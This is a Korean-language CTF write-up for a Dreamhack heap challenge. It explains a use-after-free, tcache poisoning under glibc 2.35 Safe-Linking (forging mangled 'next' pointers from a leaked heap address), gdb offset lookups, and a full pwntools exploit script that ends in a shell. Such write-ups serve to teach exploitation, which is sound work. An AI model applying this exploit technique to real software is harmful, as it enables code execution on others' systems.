# Tcache Poisoning with Safe-Linking

## 개요

이 문제는 glibc의 **tcache poisoning**을 이용하는 전형적인 힙 문제이지만, 배포 환경이 **glibc 2.35**(Ubuntu 22.04)라서 **Safe-Linking**이 적용되어 있다는 점이 핵심임. glibc 2.32부터 tcache/fastbin의 single-linked list `next`(fd) 포인터가 평문이 아니라 **포인터가 저장되는 주소로 mangle된 값**으로 저장됨. 따라서 예전처럼 free된 tcache 청크의 `next`에 목표 주소를 그대로 덮어쓰면 오히려 crash가 나고, **mangle 연산을 재현해서 인코딩된 값**을 써야 함.

목표는 UAF를 이용한 tcache poisoning으로 전역 변수 `target`(`0x404090`) 위치에 청크를 할당받고, 그 값을 0이 아닌 값으로 바꿔 `test_target()`이 `system("/bin/sh")`를 실행하게 만드는 것임.

```c
// gcc main.c -o main -no-pie
size_t target __attribute__((aligned(16)));     // 0x404090 (bss, 초기값 0)

void test_target()
{
    if (target) {                 // target != 0 이면
        printf("Win\n");
        system("/bin/sh");        // 셸
    }
    printf("No\n");
}
```

- `-no-pie` 라서 `target`, `notes`, `note_deleted` 등 전역 주소가 전부 고정(`target = 0x404090`).
- `target`이 `aligned(16)`으로 선언되어 있어 **청크 정렬(16바이트) 조건을 자연스럽게 만족**함 → `target`을 그대로 malloc 결과(mem 포인터)로 돌려받아도 문제가 없음. 이게 fake chunk의 size/align 검사 없이 바로 할당이 되는 전제임.

## 바이너리 분석

전형적인 노트(힙) 문제지만 슬롯이 3개뿐이고 크기가 고정됨.

```c
void *notes[3];           // 0x4040a0
char note_deleted[3];     // 0x4040b8

void create_note() {
    // idx: 0~2
    note_deleted[idx] = 0;
    notes[idx] = malloc(0x10);                 // chunk size 0x20 → tcache idx 0
    printf("Note created at %p\n", notes[idx]); // ★ 힙 주소 leak 제공
}

void delete_note() {
    // idx: 0~2, note_deleted[idx] 로 double free 차단
    note_deleted[idx] = 1;
    free(notes[idx]);                          // ★ notes[idx] 를 NULL 로 안 지움 → UAF
}

void edit_note() {
    // idx: 0~2
    read(STDIN_FILENO, notes[idx], 8);         // ★ 8바이트 write (next 포인터 1개 정확히 덮음)
}
```

| 보호기법 | 값 |
|---|---|
| Arch | amd64-64-little |
| RELRO | **Partial RELRO** (GOT overwrite 가능) |
| Canary | 있음 |
| NX | 있음 |
| PIE | **No PIE** (`0x400000` 고정) |
| libc | **glibc 2.35** (Ubuntu GLIBC 2.35-0ubuntu3) → **Safe-Linking 적용** |

취약점:

- **UAF**: `delete_note`가 free 후 `notes[idx]`를 NULL로 초기화하지 않음. `note_deleted[]` 플래그는 double free만 막을 뿐, `edit_note`는 이 플래그를 검사하지 않음 → **free된 청크의 `next` 포인터를 `edit_note`로 조작 가능**.
- `malloc(0x10)` → 실제 청크 크기 `0x20` → `tcache_idx = 0`(0x20 bin). `edit_note`의 8바이트 write는 tcache 청크의 `next`(= `fd`) 필드 하나를 정확히 덮기에 충분함.

즉 **free된 tcache 청크의 `next`를 조작 → 다음 malloc이 임의 주소를 반환하도록 유도(tcache poisoning)** 하는 것이 기본 아이디어임.

## 핵심 기법: Safe-Linking

### mangle / demangle 공식

glibc 2.32부터 tcache_put / tcache_get, fastbin에 Safe-Linking이 도입됨. tcache에 청크를 넣을 때:

```c
/* glibc tcache_put */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  e->key = tcache;
  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);  // ★ next 를 mangle
  tcache->entries[tc_idx] = e;
}
```

mangle / demangle 매크로:

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

즉 저장되는 `next` 값은:

```
stored_next = (pos >> 12) ^ target_next
```

여기서 **`pos`는 `next` 필드 자신이 저장된 주소**, 즉 `&e->next = chunk2mem(chunk)` = malloc이 사용자에게 돌려주는 **mem 포인터(= 해당 청크의 힙 주소)** 임. 할당 시(`tcache_get`)에는 역연산:

```
real_next = REVEAL_PTR(stored_next) = (pos >> 12) ^ stored_next
```

로 복원됨. `pos`가 양쪽에서 동일(같은 청크의 같은 필드)하므로 XOR가 정확히 상쇄됨.

### 왜 heap leak이 필요한가

`pos >> 12`는 **청크가 올라간 힙 페이지의 상위 비트**(힙 주소를 0x1000으로 나눈 값)임. ASLR 때문에 힙 base는 매 실행마다 바뀌므로, mangle 값을 미리 계산할 수 없음. 따라서:

1. **힙 주소를 먼저 leak** 해야 하고(이 문제는 `create_note`가 `Note created at %p`로 친절하게 알려줌),
2. 그 주소로 `pos >> 12`를 계산해서,
3. 내가 넣고 싶은 주소 `target`을 `target ^ (pos >> 12)`로 인코딩한 다음,
4. 그 인코딩된 값을 free된 청크의 `next`에 써야 함.

### poc의 우회 방법

poc는 `edit_note`로 덮어쓸 **청크 0의 mem 주소(`heap_addr`) 자체가 곧 `pos`** 라는 점을 이용함. 청크 0을 free하면 그 `next` 필드는 `&e->next = heap_addr`에 있으므로, `pos = heap_addr`.

```python
edit_note(0, p64(e.symbols['target'] ^ (heap_addr >> 12)))
```

이렇게 써두면 나중에 청크 0이 tcache에서 꺼내질 때 glibc가 `REVEAL_PTR` = `(heap_addr >> 12) ^ stored`를 수행 → `(heap_addr>>12) ^ (target ^ (heap_addr>>12))` = `target`이 복원되어, tcache list의 다음 청크가 `target`으로 세팅됨.

## GDB로 오프셋/주소 구하기

이 문제에서 poc.py에 들어가는 "하드코딩/계산 값"은 세 종류뿐임. 각각이 어떻게 나오는지 정리함.

### (1) `target` 주소 = `0x404090` — No PIE 고정 심볼

`-no-pie` 바이너리라 `.bss` 전역변수 주소가 절대값으로 박혀 있음. pwntools의 `e.symbols['target']`이 그대로 심볼 테이블에서 읽어옴(stripped 아님). gdb/pwndbg로 확인:

```
pwndbg> p &target
$1 = (<data variable, no debug info> *) 0x404090 <target>
pwndbg> info address target
Symbol "target" is static storage at address 0x404090.
```

PIE가 없으므로 libc처럼 base를 더할 필요 없이 이 숫자를 그대로 씀. 참고로 다른 전역도 모두 고정:

```
pwndbg> p &notes          # 0x4040a0
pwndbg> p &note_deleted   # 0x4040b8
```

### (2) `heap_addr` — 런타임 힙 leak

하드코딩이 아니라 `create_note(0)`가 출력하는 `Note created at %p`를 그대로 파싱함(poc의 `create_note`가 `int(...split[-1],16)` 로 반환). gdb에서 힙 base와 청크 주소를 확인하는 방법:

```
pwndbg> vmmap                       # [heap] 매핑 시작 주소 확인
      0x405000  0x426000 rw-p  ...  [heap]
pwndbg> heap                        # 현재 청크들 나열
pwndbg> p notes[0]                  # malloc(0x10) 이 돌려준 mem 포인터
```

`create_note`가 알려주는 `%p` 값이 바로 `notes[0]`(= `chunk2mem(chunk0)`)이고, 이게 Safe-Linking의 `pos`로 그대로 쓰임. leak이 없다면 `vmmap`으로 얻은 `[heap]` base로부터 상대 오프셋을 더해 계산해야 하지만, 이 문제는 주소를 직접 주므로 그럴 필요가 없음.

### (3) `>> 12` — Safe-Linking mangle에 쓰는 페이지 시프트

`PROTECT_PTR`의 `pos >> 12`를 그대로 재현한 것. gdb에서 free된 청크의 `next` 필드가 실제로 mangle되어 있는지 확인:

```
pwndbg> tcachebins                  # tcache[0x20] 리스트와 mangle 상태 확인
tcachebins
0x20 [  3]: 0x405290 —▸ 0x405270 —▸ 0x405250 ... (demangle된 체인 표시)
pwndbg> x/4gx 0x405290-0x10         # free된 청크 원시 메모리
   next 필드에 평문 주소가 아니라 (addr>>12)^next 값이 들어있음
pwndbg> p/x (0x405290 >> 12)        # pos>>12 직접 계산해서 XOR 검산
```

`next_raw ^ (heap_addr >> 12)` 가 실제 다음 청크 주소와 일치하는지 확인하면 mangle 공식이 맞는지 검산 가능함.

### (참고) libc 기반 공격이라면 — `p &system`, `p &__free_hook`

이 문제는 `target`이 **No PIE 고정 전역**이라 libc leak이 필요 없음. 하지만 "일반적인 tcache poisoning → 셸" 시나리오(예: `__free_hook`를 `system`으로 덮기)에서 libc 오프셋을 구하는 방법은 다음과 같음:

```
pwndbg> vmmap                          # libc.so.6 매핑 시작(libc_base) 확인
pwndbg> p/x (char*)&system   - libc_base   # system 오프셋   (이 libc: 0x50d60)
pwndbg> p/x (char*)&__free_hook - libc_base # free_hook 오프셋 (이 libc: 0x2204a8)
```

단, **glibc 2.34부터 `__malloc_hook`/`__free_hook`은 더 이상 호출되지 않으므로**(심볼은 남아있어도 dead), 2.35인 이 문제에서는 hook overwrite가 통하지 않음. 그래서 출제자가 아예 `system`을 호출해주는 `test_target()` + 고정 전역 `target`을 공격 지점으로 제공한 것임. (Partial RELRO이므로 `target` 대신 **GOT overwrite**로 푸는 것도 가능 — poc 주석의 대안.)

## 익스플로잇 (poc.py)

```python
from pwn import *
p = remote('host3.dreamhack.games', 10294)
e = ELF('./main')
libc = ELF('libc.so.6')

def create_note(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    return int(p.recvline().decode().split(' ')[-1], 16)   # %p leak 파싱

def delete_note(idx):
    p.sendlineafter(b'> ', b'2'); p.sendlineafter(b': ', str(idx).encode())

def edit_note(idx, content):
    p.sendlineafter(b'> ', b'3'); p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b'Content: ', content)
```

### 1단계: 청크 3개 할당 + 힙 leak

```python
heap_addr = create_note(0)   # notes[0] 주소 leak (= Safe-Linking 의 pos)
create_note(1)
create_note(2)
```

`malloc(0x10)` 3번 → 모두 `0x20` 청크. 첫 할당의 반환값을 `heap_addr`로 저장(mangle 계산용).

### 2단계: 3개 전부 free → tcache count 부풀리기

```python
delete_note(2)
delete_note(1)
delete_note(0)     # tcache[0x20] head = 청크0
```

glibc 2.30+부터 `__libc_malloc`은 tcache에서 할당하기 전에 `tcache->counts[tc_idx] > 0`를 확인함. 만약 count가 2개 할당을 버틸 만큼 크지 않으면 중간에 fastbin 등으로 빠져버림. 그래서 2개만 쓰는 게 아니라 **3개를 free해서 `counts[0] = 3`으로 키워** 이후 두 번의 할당이 모두 count 검사를 통과하도록 함.

tcache[0x20] 상태: `head → 청크0 → 청크1 → 청크2`, `counts[0] = 3`.

### 3단계: tcache poisoning (Safe-Linking 고려)

```python
edit_note(0, p64(e.symbols['target'] ^ (heap_addr >> 12)))
```

free된 **청크0의 `next`** 를 `target ^ (heap_addr >> 12)`로 덮어씀. 이게 Safe-Linking의 핵심 — `target`을 그대로 쓰면 안 되고 **`pos(=heap_addr) >> 12`와 XOR한 mangle 값**을 써야 함.

결과적으로 tcache 체인(demangle 기준): `head → 청크0 → target → ...`.

### 4단계: target을 malloc으로 돌려받기

```python
create_note(0)   # tcache head(청크0) pop  → counts 3→2
create_note(1)   # REVEAL_PTR 로 복원된 target 을 pop → notes[1] = 0x404090
```

- 첫 `create_note` → 청크0 반환, count `3→2`.
- 두 번째 `create_note` → glibc가 청크0의 `next`를 `REVEAL_PTR`로 복원 = `(heap_addr>>12) ^ (target^(heap_addr>>12)) = target`. 그래서 **`target` 주소를 mem 포인터로 반환**받아 `notes[1] = 0x404090`이 됨. count `2→1`(여전히 `>0`이라 검사 통과).

`target`이 `aligned(16)`이므로 정렬 검사에 걸리지 않음.

### 5단계: target 덮어쓰고 셸

```python
edit_note(1, b'A')   # notes[1](=target) 에 'A'(0x41) write → target != 0
test_target()        # case 4 → target 이 참 → system("/bin/sh")
p.interactive()
```

`edit_note(1, ...)`가 `read(notes[1], 8)` = `read(target, 8)`로 `target`에 `0x41`을 씀. `test_target()`은 `target`이 0이 아니므로 `system("/bin/sh")` 실행.

### 단계별 상태 정리

| 단계 | 동작 | tcache[0x20] (demangle) | counts[0] |
|---|---|---|---|
| 1 | 0,1,2 할당 + heap leak | 비어있음 | 0 |
| 2 | 2,1,0 순서로 free | `head→0→1→2` | 3 |
| 3 | 청크0 `next`를 `target^(heap>>12)`로 edit | `head→0→target` | 3 |
| 4a | create_note(0) | `head→target` | 2 |
| 4b | create_note(1) → `notes[1]=target` | `head→(target의 쓰레기 next)` | 1 |
| 5 | edit_note(1,'A') → `target=0x41`, shell | — | — |

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 취약점 | UAF (free 후 `notes[idx]` 미초기화, `edit_note`가 플래그 미검사 → free된 청크 `next` 조작) |
| 기법 | tcache poisoning **+ Safe-Linking 우회** (glibc 2.35) |
| Safe-Linking 공식 | 저장: `next = (pos>>12) ^ ptr`, 복원: `ptr = (pos>>12) ^ next` (`PROTECT_PTR`/`REVEAL_PTR`) |
| `pos`의 정체 | `next` 필드가 저장된 주소 = `chunk2mem(chunk)` = malloc 반환 mem 포인터(= `heap_addr`) |
| heap leak 필요성 | ASLR로 힙 base가 매번 달라져 `pos>>12`를 미리 못 구함 → `Note created at %p`로 leak |
| count 검사 우회 | 2.30+의 `counts[tc_idx] > 0` 때문에 3개를 free해 count를 미리 키움 |
| 고정 주소 | No PIE → `target = 0x404090` (심볼 그대로), `aligned(16)`이라 청크 정렬 조건 만족 |
| 최종 목표 | `target != 0` → `test_target()` 내부 `system("/bin/sh")` |

이 문제의 교훈은 glibc 2.32+의 Safe-Linking이 tcache/fastbin `next` 포인터를 "자신이 저장된 주소"로 mangle해 보호하지만, **힙 주소 하나만 leak되면 `pos>>12`를 똑같이 계산해 mangle 값을 위조할 수 있어 보호가 무력화**된다는 점임. Safe-Linking은 "힙 leak을 막는" 방어가 아니라 "힙 leak 없이 포인터를 덮는 것"만 막는 방어임.
